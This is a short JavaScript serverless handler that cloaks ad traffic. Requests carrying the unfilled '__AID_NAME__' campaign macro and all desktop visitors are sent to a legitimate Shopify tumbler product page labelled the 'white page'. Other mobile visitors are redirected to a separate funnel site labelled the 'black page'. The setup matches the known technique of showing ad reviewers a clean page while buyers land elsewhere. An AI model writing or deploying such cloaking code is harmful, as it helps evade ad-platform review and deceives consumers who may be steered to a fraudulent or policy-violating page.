export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://hifi-live.myshopify.com/products/hi-fi-stainless-steel-40oz-black-tumbler-with-handle?srsltid=AfmBOoq-BjwJKNQbECDNHwQF34C1SztG0exi55bPcGDAv32AnVk9ChTR";
    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1736979042571105-1738006308191131-1738511238414243";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
